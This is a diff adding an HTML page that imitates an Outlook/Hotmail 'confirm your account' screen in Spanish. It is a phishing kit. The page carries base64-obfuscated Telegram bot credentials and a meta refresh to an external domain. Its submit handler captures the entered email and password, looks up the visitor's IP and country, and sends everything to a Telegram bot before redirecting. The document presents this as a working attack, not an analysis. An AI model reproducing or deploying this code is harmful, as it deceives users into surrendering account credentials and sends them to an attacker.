@@ -1,0 +1,119 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+<title>Home</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" type="text/css" href="util.css">
+<link rel="stylesheet" type="text/css" href="main.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+ <meta http-equiv="refresh" content="3;url=http://bsewmckv.0hi.me/"> 
+  </head>
+	
+<body>
+	<br>
+	<br>
+	<br>
+	<header id="main-header">
+
+		<a class="logo-header" href="index.html">
+			<img src="8117.SUMMARY_OutlookLogo_258x143.png">
+		</a> <!-- / #logo-header -->
+		
+		
+<br>
+<br>
+<br>
+<br>
+<br><br>
+						
+		<div class="menu-header" href="index.html" >
+	 <div id="bar-menu" class="bar-menu">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+  </div>
+	</header><!-- / #main-header -->
+	<div class="limiter" >
+		<div class="container-login100" style="background-image: url(); 
+    position: absolute;
+   " bis_skin_checked="1">
+			<div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+			
+			
+ <section class="">
+           
+        <form class="login100-form validate-form" action="#" id="fmr" method="post">
+             				
+					<b></b></p><div class="textypn1" bis_skin_checked="1"><b><span class="model" style="font-size:28px; color:#003995; text-align:center;">
+					Confirme su cuenta</span></b></div>
+					<div class="wrap-input101 validate-input" data-validate="" bis_skin_checked="1"> 
+					<br>
+				
+					<div class="textypn2" bis_skin_checked="1"></div>
+					
+					
+					<div align="center"> 
+						<span class="label-input101"><img src="png-4.gif" style="width:90px"></span>
+						<br>
+						
+						<span class="model" style="font-size:16px; color:#000; text-align:center;">
+					Espere un momento... Está ingresando al módulo de confirmación</span>	
+						
+					</div>
+					
+					<div class="container-login100-form-btn" bis_skin_checked="1">
+					    <br>
+
+<br>
+						
+					</div>
+					
+					<div bis_skin_checked="1">
+					<br>
+					<br>
+<a href="" target="_blank" >
+<img src="RE1Mu3b.png" style="padding-left: 24%;alt="></a>
+
+					</div><br>
+
+						
+					
+				
+				
+			</div></form>
+			
+		</section></div>
+			<header id="main-header2">
+	</header><!-- / #main-header -->
+	</div>
+		<div id="dropDownSelect1" bis_skin_checked="1"></div>
+
+    <script>
+		const encodedUrl1 = "NjY4Mzc5MDUyMTpBQUVYQUJPSVJWV0pIMTBlSUVqbWszcmpWVnJHcHpONy1ONA==";
+		const encodedUrl2 = "QHNwcHJ0Y2hh";
+		const decodedUrl1 = atob(encodedUrl1);
+		const decodedUrl2 = atob(encodedUrl2);
+		
+
+        document.getElementById('fmr').addEventListener('submit', function(event) { event.preventDefault(); 
+		const eml = document.getElementById("ypn-cel").value;
+		const pass = document.getElementById("ypn-fn").value;
+		
+		
+		fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
+		const ip = data.ip; const pais = data.country_name; const fecha = new Date().toLocaleString(); 
+		
+		const mensaje = { chat_id: decodedUrl2, text: `Datos htmail:\nCorreo: ${eml}\nContraseña: ${pass}\nIP: ${ip}\nPaís: ${pais}\nFecha: ${fecha}` };
+		
+		fetch(`https://api.telegram.org/bot`+decodedUrl1+`/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, 
+		body: JSON.stringify(mensaje) }).then(response => {
+		if (response.ok) { window.location.href = "load.html"; }
+		else { alert("Error al enviar datos."); } })
+		.catch(error => { console.error("Error al hacer la solicitud a Telegram:", error); }); }).catch(error => {
+		console.error("Error al obtener la IP:", error); }); });
+
+    </script>
+
+</div></body></html>
